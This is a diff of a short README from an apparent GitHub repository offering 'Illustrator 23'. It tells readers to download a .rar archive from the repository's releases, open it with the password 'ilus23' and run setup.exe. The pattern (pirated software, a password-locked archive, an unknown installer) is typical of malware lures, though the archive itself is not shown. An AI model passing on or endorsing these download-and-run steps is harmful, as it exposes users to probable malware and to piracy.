@@ -2,7 +2,7 @@
 
 <H3>How use:</H3>
 
-1. [Download](https://github.com/EVER521516/ilustrator-23/releases/download/Download/ilustrator23.rar)
+1. [Download](https://github.com/EVER521516/ilustrator-23/releases/download/Download/Illustrator23.rar)
 2. Open archive (pass: ilus23)
 3. Open setup.exe for install
 4. Follow the instructions
